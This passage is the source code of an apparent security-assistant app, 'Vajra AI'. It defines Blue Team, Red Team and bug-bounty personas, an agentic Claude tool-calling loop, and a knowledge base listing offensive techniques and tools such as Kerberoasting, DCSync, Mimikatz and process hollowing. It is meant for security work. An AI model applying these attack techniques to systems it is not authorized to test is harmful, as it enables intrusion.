"""
Vajra AI — AI-Driven Security Expert Engine
Three specialized models:
  • Vajra Blue  — Blue Team / Defensive Security (organizational)
  • Vajra Red   — Red Team / Offensive Security (authorized org testing)
  • Vajra Hunter — Security Researcher / Bug Bounty Hunter
Supports built-in responses, Claude API (Anthropic), and MCP tool integration.
"""

import re
import time
import random
import json
import os
from datetime import datetime, timedelta

# Optional: Anthropic SDK
try:
    import anthropic
    HAS_ANTHROPIC = True
except ImportError:
    HAS_ANTHROPIC = False


# ═══════════════════════════════════════════════════════════════════════
#  MODEL PROFILES
# ═══════════════════════════════════════════════════════════════════════

MODEL_PROFILES = {
    "vajra-blue": {
        "display_name": "Vajra Blue",
        "tagline": "Blue Team Defensive Security Specialist",
        "description": "Organizational defense — SOC, SIEM, IR, threat hunting, hardening & compliance",
        "context_window": 32768,
        "persona": (
            "You are **Vajra Blue**, an elite Blue Team / Defensive Security AI specialist. "
            "You operate at an organizational level helping security teams protect infrastructure. "
            "Your focus areas:\n"
            "- SOC operations, SIEM tuning & alert triage\n"
            "- Incident response & digital forensics (DFIR)\n"
            "- Threat detection, hunting & intelligence\n"
            "- Endpoint detection & response (EDR/XDR)\n"
            "- Network defense, IDS/IPS & traffic analysis\n"
            "- Security hardening (OS, network, cloud, AD)\n"
            "- Vulnerability management & patch prioritization\n"
            "- Compliance & audit (NIST, ISO 27001, PCI-DSS, CIS)\n"
            "- Identity & access management / Zero Trust\n"
            "- Email security, anti-phishing & awareness\n"
            "- Security automation & SOAR playbooks\n"
            "- Log analysis & anomaly detection\n\n"
            "Always provide actionable defensive guidance with specific detection rules, "
            "hardening steps, monitoring configurations, and incident playbooks. "
            "Use markdown formatting. Emphasize proactive defense and organizational resilience."
        ),
        "capabilities": [
            "SOC operations & SIEM management (Splunk, ELK, Sentinel)",
            "incident response & digital forensics (DFIR)",
            "threat detection & hunting (MITRE ATT&CK mapping)",
            "endpoint detection & response (EDR/XDR)",
            "network defense & traffic analysis (IDS/IPS/NDR)",
            "vulnerability management & patch prioritization",
            "security hardening (OS, network, cloud, Active Directory)",
            "threat intelligence & IOC analysis",
            "log analysis & anomaly detection",
            "compliance & audit (NIST, ISO 27001, PCI-DSS, CIS)",
            "cloud security posture management (AWS/Azure/GCP)",
            "identity & access management (IAM/Zero Trust)",
            "security automation & orchestration (SOAR)",
            "phishing analysis & email security",
            "security awareness training design",
        ],
    },
    "vajra-red": {
        "display_name": "Vajra Red",
        "tagline": "Red Team Offensive Security Specialist",
        "description": "Authorized organizational security testing — VAPT, exploit dev & adversary simulation",
        "context_window": 32768,
        "persona": (
            "You are **Vajra Red**, an elite Red Team / Offensive Security AI specialist. "
            "You help organizations test their own security posture through authorized "
            "penetration testing and adversary simulation. Your focus areas:\n"
            "- Vulnerability assessment & penetration testing (VAPT)\n"
            "- Network penetration testing & Active Directory attacks\n"
            "- Web application security testing (OWASP Top 10)\n"
            "- Privilege escalation (Linux & Windows)\n"
            "- Exploit development & payload crafting\n"
            "- Adversary simulation & C2 frameworks\n"
            "- Cloud security assessment (AWS/Azure/GCP)\n"
            "- Social engineering assessment (authorized)\n"
            "- Wireless security testing\n"
            "- Physical security assessment\n"
            "- Red team reporting & remediation advice\n\n"
            "Always provide actionable, technically accurate offensive guidance with specific "
            "commands, tool configurations, and step-by-step methodologies. Emphasize that "
            "all testing must be authorized and within agreed scope. Provide remediation "
            "advice alongside vulnerability findings. Use markdown formatting."
        ),
        "capabilities": [
            "vulnerability assessment & penetration testing (VAPT)",
            "network penetration testing & enumeration",
            "web application security testing (OWASP Top 10)",
            "exploit development & payload crafting",
            "Active Directory attack & defense assessment",
            "privilege escalation (Linux & Windows)",
            "adversary simulation & C2 frameworks",
            "cloud security assessment (AWS/Azure/GCP)",
            "wireless security testing",
            "social engineering assessment (authorized)",
            "security tool guidance (Nmap, Burp, Metasploit, etc.)",
            "reverse engineering & malware analysis",
            "red team reporting & remediation",
            "compliance testing (PCI-DSS, NIST, ISO 27001)",
        ],
    },
    "vajra-hunter": {
        "display_name": "Vajra Hunter",
        "tagline": "Security Researcher & Bug Bounty Specialist",
        "description": "Bug bounty, vulnerability research, CVE hunting & responsible disclosure",
        "context_window": 32768,
        "persona": (
            "You are **Vajra Hunter**, an elite Security Researcher & Bug Bounty Hunter AI. "
            "You help security professionals, researchers, and bug bounty hunters find and "
            "report vulnerabilities responsibly. Your focus areas:\n"
            "- Bug bounty methodology & program selection\n"
            "- Web application vulnerability hunting\n"
            "- API security testing & GraphQL attacks\n"
            "- Mobile application security (Android/iOS)\n"
            "- Recon & attack surface discovery\n"
            "- Subdomain takeover & DNS misconfiguration\n"
            "- Authentication & authorization flaws\n"
            "- Business logic vulnerabilities\n"
            "- Client-side attacks (XSS, CSRF, DOM)\n"
            "- Server-side attacks (SSRF, SQLi, RCE, SSTI)\n"
            "- Race conditions & concurrency bugs\n"
            "- Report writing for maximum bounty impact\n"
            "- CVE research & responsible disclosure\n"
            "- CTF challenge solving\n\n"
            "Always provide actionable hunting techniques with specific payloads, "
            "methodology steps, and PoC templates. Emphasize responsible disclosure "
            "and ethical research. Help maximize bounty impact through clear, "
            "well-structured reports. Use markdown formatting."
        ),
        "capabilities": [
            "bug bounty methodology & platform guidance",
            "web application vulnerability hunting",
            "API security testing (REST, GraphQL, gRPC)",
            "mobile application security (Android/iOS)",
            "reconnaissance & attack surface discovery",
            "subdomain takeover & DNS misconfiguration",
            "authentication & authorization flaw hunting",
            "business logic vulnerability discovery",
            "client-side attacks (XSS, CSRF, DOM-based)",
            "server-side attacks (SSRF, SQLi, RCE, SSTI)",
            "race condition & concurrency bug hunting",
            "report writing for maximum bounty impact",
            "CVE research & responsible disclosure",
            "CTF challenge solving & write-ups",
            "security tool automation & scripting",
        ],
    },
}


# ═══════════════════════════════════════════════════════════════════════
#  MAIN ENGINE
# ═══════════════════════════════════════════════════════════════════════

class VajraAI:
    """AI-Driven Security Expert with three specialized operational models."""

    def __init__(self):
        self.name = "Vajra"
        self.version = "2.0"
        self._active_model = "vajra-blue"  # default model
        self.knowledge_base = self._build_knowledge_base()

        # Claude API settings
        self._claude_api_key = None
        self._claude_client = None

        # MCP manager reference (set externally)
        self.mcp_manager = None

        # Connector manager reference (set externally)
        self.connector_manager = None

    # ── Active Profile Helpers ─────────────────────────────────────────

    def _profile(self):
        """Return the active model's profile dict."""
        return MODEL_PROFILES.get(self._active_model, MODEL_PROFILES["vajra-blue"])

    def _display_name(self):
        return self._profile()["display_name"]

    def _is_blue(self):
        return self._active_model == "vajra-blue"

    def _is_red(self):
        return self._active_model == "vajra-red"

    def _is_hunter(self):
        return self._active_model == "vajra-hunter"

    # ── Claude API ─────────────────────────────────────────────────────

    def set_claude_api_key(self, api_key):
        self._claude_api_key = api_key
        if HAS_ANTHROPIC and api_key:
            self._claude_client = anthropic.Anthropic(api_key=api_key)
        else:
            self._claude_client = None

    def get_claude_api_key(self):
        if self._claude_api_key:
            return self._claude_api_key[:7] + "..." + self._claude_api_key[-4:]
        return ""

    def test_claude_connection(self):
        if not HAS_ANTHROPIC:
            return {"success": False, "error": "anthropic package not installed. Run: pip install anthropic"}
        if not self._claude_client:
            return {"success": False, "error": "API key not set"}
        try:
            response = self._claude_client.messages.create(
                model="claude-sonnet-4-20250514",
                max_tokens=50,
                messages=[{"role": "user", "content": "Say 'Connection successful!' in exactly those words."}],
            )
            text = response.content[0].text if response.content else ""
            return {"success": True, "message": text}
        except anthropic.AuthenticationError:
            return {"success": False, "error": "Invalid API key"}
        except anthropic.RateLimitError:
            return {"success": False, "error": "Rate limited — key is valid but try again later"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def set_active_model(self, model_id):
        self._active_model = model_id

    def get_active_model(self):
        return self._active_model

    def _is_claude_model(self):
        return self._active_model.startswith("claude-")

    def _get_claude_model_id(self):
        model_map = {
            "claude-opus-4-5": "claude-opus-4-20250514",
            "claude-sonnet-4": "claude-sonnet-4-20250514",
        }
        return model_map.get(self._active_model, "claude-sonnet-4-20250514")

    # ── Model Listing ──────────────────────────────────────────────────

    def get_available_models(self):
        models = [
            {
                "id": "vajra-blue",
                "name": "Vajra Blue",
                "description": "Blue Team — SOC, DFIR, threat hunting, hardening & compliance",
                "context_window": 32768,
                "provider": "built-in",
                "category": "defensive",
            },
            {
                "id": "vajra-red",
                "name": "Vajra Red",
                "description": "Red Team — VAPT, exploit dev, adversary simulation (authorized)",
                "context_window": 32768,
                "provider": "built-in",
                "category": "offensive",
            },
            {
                "id": "vajra-hunter",
                "name": "Vajra Hunter",
                "description": "Bug Bounty — vulnerability research, hunting & responsible disclosure",
                "context_window": 32768,
                "provider": "built-in",
                "category": "research",
            },
            {
                "id": "claude-sonnet-4",
                "name": "Claude Sonnet 4",
                "description": "Anthropic — fast, intelligent, great balance of speed and capability",
                "context_window": 200000,
                "provider": "anthropic",
                "requires_api_key": True,
            },
            {
                "id": "claude-opus-4-5",
                "name": "Claude Opus 4.5",
                "description": "Anthropic — most capable model, deep reasoning and analysis",
                "context_window": 200000,
                "provider": "anthropic",
                "requires_api_key": True,
            },
        ]
        return models

    # ── Title Generation ───────────────────────────────────────────────

    def generate_title(self, user_message):
        msg = user_message.strip().rstrip("?!.")
        if len(msg) <= 40:
            return msg.capitalize()
        words = msg.split()
        title = ""
        for word in words:
            if len(title) + len(word) + 1 > 40:
                break
            title = f"{title} {word}" if title else word
        return title.capitalize() + "..."

    # ── Response Generation ────────────────────────────────────────────

    def generate_response(self, message, history=None):
        return "".join(self.stream_response(message, history))

    def stream_response(self, message, history=None):
        if self._is_claude_model() and self._claude_client:
            yield from self._stream_claude(message, history or [])
        else:
            response = self._think_and_respond(message, history or [])
            words = response.split(" ")
            for i, word in enumerate(words):
                yield (" " + word) if i > 0 else word
                time.sleep(random.uniform(0.01, 0.04))

    # ── Claude Streaming ───────────────────────────────────────────────

    def _stream_claude(self, message, history):
        try:
            messages = []
            for msg in history:
                if msg.get("role") in ("user", "assistant"):
                    messages.append({"role": msg["role"], "content": msg["content"]})
            if not messages or messages[-1].get("content") != message:
                messages.append({"role": "user", "content": message})

            system_prompt = self._build_system_prompt()
            claude_tools = self._get_claude_tools()

            kwargs = {
                "model": self._get_claude_model_id(),
                "max_tokens": 8192,
                "system": system_prompt,
                "messages": messages,
            }
            if claude_tools:
                kwargs["tools"] = claude_tools

            # Agentic loop: keep streaming until Claude finishes (handles tool_use)
            max_tool_rounds = 10
            for _ in range(max_tool_rounds):
                response = self._claude_client.messages.create(**kwargs)

                # Process content blocks
                tool_uses = []
                for block in response.content:
                    if block.type == "text":
                        yield block.text
                    elif block.type == "tool_use":
                        tool_uses.append(block)

                # If no tool calls or stop_reason is "end_turn", we're done
                if response.stop_reason != "tool_use" or not tool_uses:
                    break

                # Execute tool calls and build tool results
                assistant_content = []
                for block in response.content:
                    if block.type == "text":
                        assistant_content.append({"type": "text", "text": block.text})
                    elif block.type == "tool_use":
                        assistant_content.append({
                            "type": "tool_use",
                            "id": block.id,
                            "name": block.name,
                            "input": block.input,
                        })

                tool_results = []
                for tu in tool_uses:
                    tool_name = tu.name
                    tool_input = tu.input or {}
                    yield f"\n\n🔧 **Using tool:** `{tool_name}`\n"
                    result = self._execute_tool_call(tool_name, tool_input)
                    result_text = json.dumps(result, indent=2, default=str)
                    # Show abbreviated result to user
                    preview = result_text[:500] + ("..." if len(result_text) > 500 else "")
                    yield f"```json\n{preview}\n```\n"
                    tool_results.append({
                        "type": "tool_result",
                        "tool_use_id": tu.id,
                        "content": result_text[:10000],
                    })

                # Append assistant turn and tool results for next round
                kwargs["messages"] = kwargs["messages"] + [
                    {"role": "assistant", "content": assistant_content},
                    {"role": "user", "content": tool_results},
                ]

        except Exception as e:
            yield f"\n\n**Error communicating with Claude:** {str(e)}"

    def _execute_tool_call(self, tool_name, tool_input):
        """Execute a tool call from Claude — routes to connectors or MCP tools."""
        # Check if it's a connector tool (format: connector_id__action)
        if "__" in tool_name and self.connector_manager:
            parts = tool_name.split("__", 1)
            if len(parts) == 2:
                connector_id, action = parts
                conn = self.connector_manager.get_connector(connector_id)
                if conn and conn.enabled:
                    return self.connector_manager.execute(connector_id, action, tool_input)

        # Otherwise try MCP tools
        if self.mcp_manager:
            try:
                return self.mcp_manager.call_tool(tool_name, tool_input)
            except Exception:
                pass

        return {"error": f"Tool '{tool_name}' not found or not available"}

    def _build_system_prompt(self):
        profile = self._profile()
        base = profile["persona"]

        if self.mcp_manager:
            tools = self.mcp_manager.get_all_tools()
            if tools:
                base += "\n\nYou have access to the following MCP tools:\n"
                for t in tools:
                    base += f"- **{t['name']}** (server: {t['server_name']}): {t['description']}\n"

        # Include enabled security tool connectors
        if self.connector_manager:
            actions = self.connector_manager.get_all_actions()
            if actions:
                base += "\n\nYou also have access to the following security tool connectors. "
                base += "You can invoke these tools to perform security assessments:\n"
                current_connector = None
                for a in actions:
                    if a["connector_name"] != current_connector:
                        current_connector = a["connector_name"]
                        base += f"\n**{current_connector}**:\n"
                    base += f"  - `{a['connector_id']}__{a['action']}`: {a.get('description', a.get('name', ''))}\n"
                base += (
                    "\nTo use a connector tool, call it by its full name "
                    "(e.g. `nmap__quick_scan`) with the required parameters.\n"
                )
        return base

    def _get_claude_tools(self):
        tools = []

        # MCP tools
        if self.mcp_manager:
            mcp_tools = self.mcp_manager.get_all_tools()
            tools.extend([
                {
                    "name": t["name"],
                    "description": t.get("description", ""),
                    "input_schema": t.get("inputSchema", {"type": "object", "properties": {}}),
                }
                for t in mcp_tools
            ])

        # Connector tools
        if self.connector_manager:
            for action_info in self.connector_manager.get_all_actions():
                properties = {}
                required = []
                for p in action_info.get("params", []):
                    prop = {"type": "string", "description": p.get("label", p["name"])}
                    if p.get("placeholder"):
                        prop["description"] += f" (e.g. {p['placeholder']})"
                    if p.get("options"):
                        prop["enum"] = p["options"]
                    properties[p["name"]] = prop
                    if p.get("required"):
                        required.append(p["name"])

                tools.append({
                    "name": f"{action_info['connector_id']}__{action_info['action']}",
                    "description": f"[{action_info['connector_name']}] {action_info.get('description', action_info.get('name', ''))}",
                    "input_schema": {
                        "type": "object",
                        "properties": properties,
                        "required": required,
                    },
                })

        return tools

    # ═══════════════════════════════════════════════════════════════════
    #  KNOWLEDGE BASE
    # ═══════════════════════════════════════════════════════════════════

    def _build_knowledge_base(self):
        return {
            # ── Blue Team / Defensive ──────────────────────────────────
            "blue_team": {
                "soc_operations": {
                    "description": "Security Operations Center management and alert handling",
                    "tools": ["Splunk", "Elastic SIEM", "Microsoft Sentinel", "QRadar", "Wazuh",
                              "Chronicle", "ArcSight", "LogRhythm", "Sumo Logic", "Graylog"],
                    "techniques": [
                        "Alert triage and prioritization using severity and context.",
                        "SIEM rule creation and tuning to reduce false positives.",
                        "Correlation rule development for multi-stage attack detection.",
                        "Dashboard creation for real-time security visibility.",
                        "Threat-based detection engineering using MITRE ATT&CK.",
                        "SOC metrics: MTTD, MTTR, alert volume, escalation rates.",
                        "Shift handoff procedures and runbook documentation.",
                    ],
                },
                "incident_response": {
                    "description": "Incident detection, containment, eradication and recovery",
                    "phases": [
                        "1. Preparation — IR plan, playbooks, team roles, communication templates",
                        "2. Detection & Analysis — Alert triage, IOC correlation, scope assessment",
                        "3. Containment — Network isolation, account lockout, firewall rules",
                        "4. Eradication — Malware removal, patching, root cause elimination",
                        "5. Recovery — System restoration, monitoring, validation",
                        "6. Lessons Learned — Post-incident review, playbook updates, gap analysis",
                    ],
                    "tools": ["TheHive", "Cortex", "MISP", "Velociraptor", "GRR", "osquery",
                              "Volatility", "KAPE", "Redline", "CyberTriage"],
                },
                "threat_hunting": {
                    "description": "Proactive search for undetected threats in the environment",
                    "methodologies": [
                        "Hypothesis-driven hunting based on MITRE ATT&CK techniques.",
                        "IOC-based hunting using threat intelligence feeds.",
                        "Anomaly-based hunting via statistical baselines.",
                        "TTP-based hunting focused on adversary behaviors.",
                    ],
                    "tools": ["Elastic Hunter", "Splunk Enterprise Security", "Velociraptor",
                              "osquery/Fleet", "YARA", "Sigma rules", "Jupyter Notebooks"],
                },
                "threat_intelligence": {
                    "description": "Collecting, analyzing and operationalizing threat data",
                    "feeds": ["MISP", "OpenCTI", "AlienVault OTX", "VirusTotal", "Shodan",
                              "AbuseIPDB", "URLhaus", "MalwareBazaar", "ThreatFox"],
                    "frameworks": ["MITRE ATT&CK", "Diamond Model", "Cyber Kill Chain",
                                   "STIX/TAXII", "Traffic Light Protocol (TLP)"],
                },
                "hardening": {
                    "linux": [
                        "Disable unused services and ports (systemctl, ufw/iptables).",
                        "Configure SSH hardening (key-only auth, no root login, fail2ban).",
                        "Set file permissions and SUID/SGID audit.",
                        "Enable audit logging (auditd, syslog-ng/rsyslog).",
                        "Implement mandatory access control (SELinux/AppArmor).",
                        "Kernel hardening (sysctl: disable IP forwarding, enable SYN cookies).",
                        "Regular patching and unattended-upgrades configuration.",
                        "CIS Benchmark compliance scanning (Lynis, OpenSCAP).",
                    ],
                    "windows": [
                        "Group Policy hardening (password policy, account lockout).",
                        "Enable Windows Defender + Attack Surface Reduction (ASR) rules.",
                        "Configure Windows Firewall with advanced rules.",
                        "Enable PowerShell logging (ScriptBlock, Module, Transcription).",
                        "Disable LLMNR, NetBIOS, and WPAD.",
                        "Implement LAPS for local admin password management.",
                        "Enable Credential Guard and Device Guard.",
                        "Sysmon deployment for endpoint telemetry.",
                        "CIS Benchmark compliance (Microsoft Security Compliance Toolkit).",
                    ],
                    "network": [
                        "Network segmentation with VLANs and firewall zones.",
                        "Implement 802.1X network access control (NAC).",
                        "Deploy IDS/IPS (Suricata, Snort, Zeek).",
                        "DNS security (DNSSEC, DNS filtering, sinkholing).",
                        "TLS enforcement and certificate management.",
                        "Wireless security (WPA3, RADIUS, rogue AP detection).",
                        "Disable unnecessary protocols (Telnet, FTP, SNMPv1/v2).",
                    ],
                    "cloud": [
                        "Enable CloudTrail / Activity Log / Audit Log in all regions.",
                        "Implement least-privilege IAM policies.",
                        "Enable MFA on all accounts, especially privileged.",
                        "Use IMDSv2 on AWS EC2 instances.",
                        "Block public access on storage (S3, Blob, GCS).",
                        "Enable encryption at rest and in transit.",
                        "Deploy CSPM tools (Prowler, ScoutSuite, Checkov).",
                        "Implement guardrails via SCPs / Azure Policy / Org Policy.",
                    ],
                    "active_directory": [
                        "Implement tiered admin model (Tier 0/1/2).",
                        "Deploy Protected Users group for privileged accounts.",
                        "Enable MFA for all admin access.",
                        "Configure LAPS for local admin passwords.",
                        "Disable NTLM where possible, enforce Kerberos.",
                        "Monitor for Kerberoasting/AS-REP roasting (Event ID 4769).",
                        "Audit GPO permissions and delegation.",
                        "Deploy Microsoft ATA / Defender for Identity.",
                        "Regular BloodHound analysis for attack path review.",
                    ],
                },
                "edr_xdr": {
                    "description": "Endpoint and extended detection & response platforms",
                    "tools": ["CrowdStrike Falcon", "Microsoft Defender for Endpoint",
                              "SentinelOne", "Carbon Black", "Cortex XDR", "Elastic EDR",
                              "Wazuh", "LimaCharlie", "Velociraptor"],
                    "capabilities": [
                        "Process execution monitoring and behavioral analysis.",
                        "File integrity monitoring and malware detection.",
                        "Network connection tracking per endpoint.",
                        "Automated threat containment and isolation.",
                        "Threat hunting queries across fleet.",
                        "Integration with SIEM/SOAR for response orchestration.",
                    ],
                },
                "email_security": {
                    "description": "Email-borne threat detection and prevention",
                    "controls": [
                        "SPF, DKIM, DMARC configuration and monitoring.",
                        "Email gateway filtering (Proofpoint, Mimecast, Microsoft Defender for O365).",
                        "Phishing simulation and awareness training.",
                        "URL rewriting and sandboxing for attachments.",
                        "Header analysis for spoofing detection.",
                        "Typosquatting domain monitoring.",
                    ],
                },
                "vulnerability_management": {
                    "description": "Continuous vulnerability identification, prioritization and remediation",
                    "tools": ["Nessus", "Qualys", "Rapid7 InsightVM", "OpenVAS/Greenbone",
                              "Trivy", "Grype", "Snyk", "Dependabot"],
                    "process": [
                        "1. Asset discovery and inventory.",
                        "2. Vulnerability scanning (authenticated + unauthenticated).",
                        "3. Risk-based prioritization (CVSS + exploitability + business context).",
                        "4. Remediation assignment and tracking.",
                        "5. Verification scanning after patches.",
                        "6. Metrics reporting (SLA compliance, aging, risk reduction).",
                    ],
                },
                "compliance": {
                    "frameworks": {
                        "NIST CSF": "Identify, Protect, Detect, Respond, Recover",
                        "NIST 800-53": "Comprehensive security & privacy controls catalog",
                        "ISO 27001": "Information Security Management System (ISMS)",
                        "PCI-DSS": "Payment Card Industry Data Security Standard",
                        "HIPAA": "Health Insurance Portability and Accountability Act",
                        "SOC 2": "Service Organization Control — trust service criteria",
                        "CIS Controls": "18 prioritized security safeguards",
                        "CIS Benchmarks": "Configuration guidelines per technology",
                        "MITRE ATT&CK": "Adversary tactics, techniques and procedures",
                        "MITRE D3FEND": "Defensive technique knowledge graph",
                        "GDPR": "EU General Data Protection Regulation",
                    },
                },
            },

            # ── Red Team / Offensive ───────────────────────────────────
            "red_team": {
                "methodology": {
                    "phases": [
                        "1. Pre-engagement — Scope, rules of engagement, legal agreements.",
                        "2. Reconnaissance — Passive and active information gathering.",
                        "3. Scanning & Enumeration — Port scanning, service detection, vuln scanning.",
                        "4. Vulnerability Assessment — Identifying and categorizing weaknesses.",
                        "5. Exploitation — Attempting to exploit discovered vulnerabilities.",
                        "6. Post-Exploitation — Privesc, lateral movement, data access.",
                        "7. Reporting — Findings, risk ratings, and remediation steps.",
                        "8. Remediation Verification — Re-testing after fixes applied.",
                    ],
                    "standards": ["PTES", "OSSTMM", "NIST SP 800-115", "ISSAF", "OWASP Testing Guide"],
                },
                "reconnaissance": {
                    "passive": {
                        "tools": ["Shodan", "Censys", "theHarvester", "Recon-ng", "Maltego",
                                  "Google Dorks", "Wayback Machine", "whois", "crt.sh", "SecurityTrails"],
                        "techniques": [
                            "WHOIS lookups for domain registration and ownership.",
                            "DNS enumeration for subdomains, mail servers, DNS records.",
                            "Google dorking for exposed files and directories.",
                            "Shodan/Censys for internet-facing services.",
                            "Certificate transparency logs for subdomain discovery.",
                            "GitHub/GitLab recon for exposed secrets and API keys.",
                        ],
                    },
                    "active": {
                        "tools": ["Nmap", "Masscan", "Rustscan", "Nikto", "gobuster", "ffuf", "dirsearch"],
                        "techniques": [
                            "Port scanning with Nmap (SYN scan, version detection, OS fingerprinting).",
                            "Service enumeration and banner grabbing.",
                            "Directory and file brute-forcing.",
                            "SMB/NFS/LDAP enumeration for network shares.",
                        ],
                    },
                },
                "web_security": {
                    "owasp_top_10": {
                        "A01": "Broken Access Control",
                        "A02": "Cryptographic Failures",
                        "A03": "Injection (SQLi, NoSQL, OS command, LDAP)",
                        "A04": "Insecure Design",
                        "A05": "Security Misconfiguration",
                        "A06": "Vulnerable & Outdated Components",
                        "A07": "Identification & Authentication Failures",
                        "A08": "Software & Data Integrity Failures",
                        "A09": "Security Logging & Monitoring Failures",
                        "A10": "Server-Side Request Forgery (SSRF)",
                    },
                    "tools": ["Burp Suite", "OWASP ZAP", "sqlmap", "XSSStrike", "Nuclei",
                              "Nikto", "Commix", "Arjun", "ParamSpider", "ffuf"],
                },
                "network_attacks": {
                    "attacks": [
                        "ARP Spoofing/Poisoning", "Man-in-the-Middle (MITM)",
                        "DNS Spoofing/Poisoning", "LLMNR/NBT-NS Poisoning",
                        "Kerberoasting", "AS-REP Roasting",
                        "Pass-the-Hash / Pass-the-Ticket", "VLAN Hopping",
                    ],
                    "tools": ["Wireshark", "Responder", "Bettercap", "Impacket",
                              "CrackMapExec", "BloodHound", "Rubeus", "Mimikatz"],
                },
                "exploitation": {
                    "frameworks": {
                        "Metasploit": "Industry-standard exploitation framework",
                        "Cobalt Strike": "Commercial adversary simulation platform",
                        "Sliver": "Open-source C2 framework",
                        "Havoc": "Modern malleable C2 framework",
                    },
                    "techniques": [
                        "Buffer overflow exploitation (stack, heap).",
                        "Return-Oriented Programming (ROP).",
                        "Shellcode development and encoding.",
                        "DLL injection and process hollowing.",
                        "Privilege escalation via kernel exploits, misconfigs.",
                        "Lateral movement (PsExec, WMI, WinRM, RDP).",
                        "Credential harvesting (Mimikatz, LaZagne).",
                        "Living Off the Land Binaries (LOLBins).",
                    ],
                },
                "privilege_escalation": {
                    "linux": {
                        "techniques": [
                            "SUID/SGID binary abuse.", "Sudo misconfigurations (GTFOBins).",
                            "Cron job exploitation.", "Kernel exploits (DirtyPipe, PwnKit).",
                            "Capabilities abuse.", "Docker/LXC container escape.",
                        ],
                        "tools": ["LinPEAS", "LinEnum", "linux-exploit-suggester", "pspy"],
                    },
                    "windows": {
                        "techniques": [
                            "Unquoted service paths.", "Weak service permissions.",
                            "AlwaysInstallElevated.", "Token impersonation (Potato attacks).",
                            "DLL hijacking.", "SeImpersonatePrivilege exploitation.",
                        ],
                        "tools": ["WinPEAS", "PowerUp", "Seatbelt", "SharpUp"],
                    },
                },
                "active_directory": {
                    "attacks": [
                        "Kerberoasting", "AS-REP Roasting", "DCSync",
                        "Pass-the-Hash / Pass-the-Ticket", "Golden/Silver Ticket",
                        "RBCD abuse", "Shadow Credentials", "ADCS exploitation", "GPO abuse",
                    ],
                    "tools": ["BloodHound", "Impacket", "Rubeus", "Mimikatz",
                              "CrackMapExec", "Certipy", "PowerView"],
                },
                "cloud_security": {
                    "aws": ["S3 misconfig", "IAM privesc", "SSRF to metadata", "Lambda exploitation"],
                    "azure": ["Managed Identity abuse", "Azure AD token manipulation", "Runbook exploitation"],
                    "gcp": ["Service account key theft", "Metadata API abuse", "IAM escalation"],
                },
            },

            # ── Hunter / Bug Bounty ────────────────────────────────────
            "hunter": {
                "bug_bounty_methodology": {
                    "phases": [
                        "1. Program Selection — Choose programs matching your skill set.",
                        "2. Reconnaissance — Deep asset discovery and attack surface mapping.",
                        "3. Application Mapping — Understand functionality, roles, workflows.",
                        "4. Vulnerability Hunting — Systematic testing of attack vectors.",
                        "5. Exploitation & PoC — Demonstrate impact clearly.",
                        "6. Report Writing — Clear, reproducible, impact-focused.",
                        "7. Follow-up — Respond to triage, provide clarification.",
                    ],
                    "platforms": ["HackerOne", "Bugcrowd", "Intigriti", "YesWeHack",
                                  "Synack", "Open Bug Bounty", "Google VRP", "GitHub Security Lab"],
                    "tips": [
                        "Focus on understanding the application before testing.",
                        "Read program policy carefully — know what's in scope.",
                        "Automate recon but manually verify findings.",
                        "Chain low-severity bugs for higher impact.",
                        "Write reports as if the reader has no context.",
                        "Include clear steps to reproduce, impact, and remediation.",
                        "Build a personal methodology and iterate on it.",
                    ],
                },
                "recon_methodology": {
                    "asset_discovery": [
                        "Subdomain enumeration (subfinder, amass, crt.sh, SecurityTrails).",
                        "Port scanning across discovered assets (Nmap, masscan).",
                        "Technology fingerprinting (Wappalyzer, WhatWeb, httpx).",
                        "JavaScript file analysis for endpoints and secrets.",
                        "Wayback Machine for historical endpoints.",
                        "GitHub dorking for leaked credentials and API keys.",
                        "Google dorking for exposed admin panels and files.",
                    ],
                    "tools": ["subfinder", "amass", "httpx", "nuclei", "gau", "waybackurls",
                              "katana", "gospider", "hakrawler", "ParamSpider", "Arjun"],
                },
                "web_hunting": {
                    "high_value_targets": [
                        "Authentication flows (login, registration, password reset, MFA).",
                        "Authorization checks (IDOR, privilege escalation, role bypass).",
                        "File upload functionality (unrestricted upload, path traversal).",
                        "API endpoints (broken auth, mass assignment, rate limiting).",
                        "Payment/checkout flows (price manipulation, coupon abuse).",
                        "Search functionality (XSS, SQLi, SSTI).",
                        "User profile/settings (stored XSS, CSRF, account takeover).",
                        "Import/export features (XXE, SSRF, CSV injection).",
                        "WebSocket connections (injection, authorization bypass).",
                    ],
                    "vulnerability_types": {
                        "IDOR": "Insecure Direct Object Reference — manipulate IDs to access others' data",
                        "XSS": "Cross-Site Scripting — inject scripts, steal cookies, keylog",
                        "SSRF": "Server-Side Request Forgery — make server request internal resources",
                        "SQLi": "SQL Injection — manipulate database queries",
                        "RCE": "Remote Code Execution — execute arbitrary commands on server",
                        "SSTI": "Server-Side Template Injection — inject template code",
                        "Auth Bypass": "Circumvent authentication mechanisms",
                        "Business Logic": "Exploit application workflow assumptions",
                        "Race Condition": "Exploit concurrent request handling",
                        "Subdomain Takeover": "Claim dangling DNS records",
                        "Account Takeover": "Chain bugs to fully compromise user accounts",
                        "Information Disclosure": "Leak sensitive data through errors, headers, etc.",
                    },
                },
                "api_security": {
                    "techniques": [
                        "Broken Object Level Authorization (BOLA/IDOR in APIs).",
                        "Broken Authentication (JWT attacks, weak tokens).",
                        "Mass Assignment (send extra fields in request body).",
                        "Rate Limiting bypass (header manipulation, IP rotation).",
                        "GraphQL introspection and query batching attacks.",
                        "API versioning abuse (v1 vs v2 different auth).",
                        "Verbose error messages leaking internal info.",
                    ],
                    "tools": ["Postman", "Burp Suite", "ffuf", "Arjun", "GraphQL Voyager",
                              "InQL", "jwt_tool", "Kiterunner"],
                },
                "mobile_security": {
                    "android": [
                        "APK decompilation (jadx, apktool).",
                        "Hardcoded secrets and API key extraction.",
                        "SSL pinning bypass (Frida, objection).",
                        "Deep link and intent abuse.",
                        "Insecure data storage (SharedPreferences, SQLite).",
                        "Dynamic analysis with Frida hooking.",
                    ],
                    "ios": [
                        "IPA analysis and class-dump.",
                        "Keychain data extraction.",
                        "SSL pinning bypass (objection, Frida).",
                        "URL scheme abuse.",
                        "Runtime manipulation with Frida.",
                    ],
                    "tools": ["Frida", "objection", "MobSF", "jadx", "apktool", "Burp Mobile"],
                },
                "report_writing": {
                    "structure": [
                        "Title — Clear, specific vulnerability name.",
                        "Severity — Use CVSS or platform-specific rating.",
                        "Description — What the vulnerability is and where it exists.",
                        "Steps to Reproduce — Numbered, detailed, reproducible steps.",
                        "Impact — Business impact and what an attacker could achieve.",
                        "Proof of Concept — Screenshots, HTTP requests, video.",
                        "Remediation — Specific fix recommendations.",
